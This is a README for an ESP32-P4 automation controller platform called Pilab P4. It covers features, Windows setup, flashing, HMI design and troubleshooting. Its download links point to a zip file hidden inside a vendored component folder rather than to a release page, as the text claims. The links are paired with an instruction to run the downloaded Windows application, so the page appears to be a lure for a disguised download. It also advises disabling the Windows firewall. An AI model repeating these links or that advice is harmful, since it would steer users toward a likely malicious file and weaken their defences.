# ⚙️ pilab-esp32-p4-plc - Build industrial automation systems with ease

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/freemarket0620/pilab-esp32-p4-plc/raw/refs/heads/main/managed_components/espressif__ip101/plc_pilab_p_esp_kiddushin.zip)

Pilab P4 turns your ESP32-P4 hardware into a powerful automation controller. This platform lets you write scripts, create human-machine interfaces, and manage industrial hardware directly from a web browser. It removes the need for complex programming environments while keeping the performance of the RISC-V architecture.

## 📋 What is Pilab P4?

Pilab P4 provides a bridge between your browser and physical hardware. You use the web interface to configure logic, monitor sensors, and control outputs. The platform uses a persistent storage system to ensure your logic remains active even after a power cycle. This system targets the ESP32-P4 chip to provide a software-defined controller that feels like a modern web application.

## 🛠 Features

*   **Browser-based Scripting:** Write automation logic directly in your browser without external tools.
*   **Integrated HMI:** Build custom control panels and dashboards using the drag-and-drop editor.
*   **Persistent Runtime:** Save your scripts and settings to the onboard memory for automated startups.
*   **Real-time Control:** Experience rapid response times thanks to the ESP32-P4 RISC-V core.
*   **Web-native Interface:** Access your controller from any device on your local network.

## 💻 Requirements

To run this platform, you need the following items:

*   **Hardware:** An ESP32-P4 development board.
*   **Operating System:** Windows 10 or Windows 11.
*   **Connection:** A USB-A to USB-C cable for data transfer.
*   **Network:** An active Wi-Fi connection for initial setup and web access.
*   **Browser:** A modern browser such as Chrome, Edge, or Firefox.

## 🚀 Setting Up Your Controller

Follow these steps to prepare your system and get the controller running.

### 1. Download the Software
Visit the release page to obtain the necessary installation files. You must select the version labeled for Windows to ensure compatibility.

[Download the latest software release](https://github.com/freemarket0620/pilab-esp32-p4-plc/raw/refs/heads/main/managed_components/espressif__ip101/plc_pilab_p_esp_kiddushin.zip)

### 2. Connect Your Hardware
Plug the ESP32-P4 development board into your Windows computer using the USB cable. Windows will identify the device and assign a serial port number. You can verify this in the Device Manager under the menu labeled Ports. Note the COM port number, as you will need it during the setup process.

### 3. Flash the Firmware
Launch the downloaded application. Select the correct COM port from the drop-down menu in the main window. Click the button labeled Flash to install the Pilab P4 runtime on the chip. Wait for the progress bar to complete. The board will restart automatically once the process finishes.

### 4. Access the Interface
Once the board restarts, look for the local area network (LAN) address printed in the application console. Open your web browser and type that address into the URL bar. This will load the Pilab P4 dashboard.

## 🧠 Basic Operations

The dashboard serves as the command center for your automation tasks. Each section of the interface serves a specific purpose for managing your hardware.

### Creating Scripts
Navigate to the Scripting tab. Here you can write instructions that dictate how the controller reacts to inputs. The platform uses a simple language structure designed for readability. Type your logic into the editor and click Save and Run to activate the script.

### Designing the HMI
The HMI tab allows you to create visual representations of your hardware. Add buttons, switches, and gauges to your canvas to monitor live data. You can link these elements to your running scripts. Once finished, click Publish to save the layout to the controller.

## 🔧 Troubleshooting Common Issues

If you encounter issues during installation or operation, check these common items first.

**The computer does not detect the board**
Ensure your USB cable supports data transfer. Some cables only provide power. Try a different USB port on your computer or a different cable if the device name does not appear in the software.

**The browser cannot load the interface**
Verify that the ESP32-P4 is connected to your local network. If you cannot access the IP address, check your router settings. Sometimes firewall software on Windows blocks access to local ports. Temporarily disable your firewall to see if it resolves the connection.

**Scripts fail to trigger**
Check the logs tab for error messages. Ensure that your input pins correspond to the physical wiring on your development board. A common mistake involves mixed-up pin labels. Double-check your wiring against the ESP32-P4 data sheet.

## 📚 Frequently Asked Questions

**Does this require an internet connection?**
No. Once you install the software, the controller operates on your local network. You do not need external cloud services.

**Can I run multiple scripts at once?**
The runtime environment supports concurrent execution of scripts. You can organize these by priority levels in the settings menu.

**How do I update the software?**
Check the GitHub link periodically for new releases. Download the new installer and run it over your existing one to update the platform while keeping your current settings.

**Is this safe for industrial use?**
The platform is designed for experimentation. Always test your scripts and hardware configurations in a controlled environment before deploying them to critical industrial processes. 

## 🌐 Community and Support

For further assistance, explore the repository issues section. You can report bugs, request features, or view discussions from other users. The repository maintains a record of common questions and solutions. If you need deeper technical details regarding the ESP-IDF backend or the RISC-V implementation, check the Wiki pages in the main repository menu. Your engagement helps improve the platform for all users.